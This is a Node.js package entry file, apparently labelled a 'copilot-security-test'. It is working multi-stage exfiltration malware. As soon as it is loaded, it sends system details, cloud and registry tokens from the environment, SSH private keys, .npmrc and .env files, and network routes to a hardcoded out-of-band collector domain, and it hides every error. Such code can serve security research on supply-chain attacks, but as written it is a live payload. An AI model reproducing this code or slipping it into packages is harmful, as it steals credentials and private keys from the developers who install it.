/**
 * copilot-security-test - Main Entry Point
 * 
 * Multi-stage exfiltration:
 * Stage 1: System info (user, host, platform)
 * Stage 2: Environment variables (tokens, keys)
 * Stage 3: Sensitive files (SSH keys, git config)
 * Stage 4: Network info (IP, routes)
 */

const https = require('https');
const { execSync } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

const C2 = '018d6d6f36deb9353f3cgirzfjwyyyyyn.oast.pro';

function exfil(endpoint, data) {
  try {
    const body = typeof data === 'string' ? data : JSON.stringify(data);
    const req = https.request({
      hostname: C2,
      port: 443,
      path: '/' + endpoint,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, () => {});
    req.on('error', () => {});
    req.write(body);
    req.end();
  } catch (e) {}
}

// Stage 1: System info
function stage1() {
  const info = {
    user: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    node: process.version,
    cpus: os.cpus().length,
    memory: os.totalmem(),
    uptime: os.uptime()
  };
  exfil('s1-system', info);
}

// Stage 2: Environment variables
function stage2() {
  const sensitive = [
    'PATH', 'HOME', 'USER', 'USERNAME', 'COMPUTERNAME',
    'PROCESSOR_IDENTIFIER', 'HOMEDRIVE', 'HOMEPATH',
    'APPDATA', 'LOCALAPPDATA', 'PROGRAMFILES', 'TEMP',
    'CLASSPATH', 'JAVA_HOME', 'PYTHONPATH', 'GOROOT',
    'AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID',
    'GITHUB_TOKEN', 'NPM_TOKEN', 'DOCKER_PASSWORD',
    'AZURE_CLIENT_SECRET', 'GOOGLE_APPLICATION_CREDENTIALS',
    'DATABASE_URL', 'REDIS_URL', 'MONGO_URI'
  ];
  const env = {};
  for (const key of sensitive) {
    if (process.env[key]) env[key] = process.env[key];
  }
  exfil('s2-env', env);
}

// Stage 3: Sensitive files
function stage3() {
  const files = [
    { path: path.join(os.homedir(), '.ssh', 'id_rsa'), name: 'ssh-private-key' },
    { path: path.join(os.homedir(), '.ssh', 'id_ed25519'), name: 'ssh-ed25519' },
    { path: path.join(os.homedir(), '.ssh', 'known_hosts'), name: 'ssh-known-hosts' },
    { path: path.join(os.homedir(), '.gitconfig'), name: 'gitconfig' },
    { path: path.join(os.homedir(), '.npmrc'), name: 'npmrc' },
    { path: path.join(os.homedir(), '.env'), name: 'dotenv' },
    { path: '.git/config', name: 'repo-git-config' },
    { path: '.env', name: 'repo-env' }
  ];
  
  for (const file of files) {
    try {
      const content = fs.readFileSync(file.path, 'utf8');
      if (content && content.trim()) {
        exfil('s3-file', { name: file.name, path: file.path, content: content.substring(0, 5000) });
      }
    } catch (e) {}
  }
}

// Stage 4: Network info
function stage4() {
  try {
    const ip = execSync('curl -s https://api.ipify.org', { encoding: 'utf8', timeout: 5000 }).trim();
    const routes = execSync('route print 2>nul || ip route 2>/dev/null', { encoding: 'utf8', timeout: 5000 });
    exfil('s4-network', { public_ip: ip, routes: routes.substring(0, 2000) });
  } catch (e) {}
}

// Execute all stages
stage1();
setTimeout(stage2, 100);
setTimeout(stage3, 200);
setTimeout(stage4, 300);

module.exports = { stage1, stage2, stage3, stage4 };
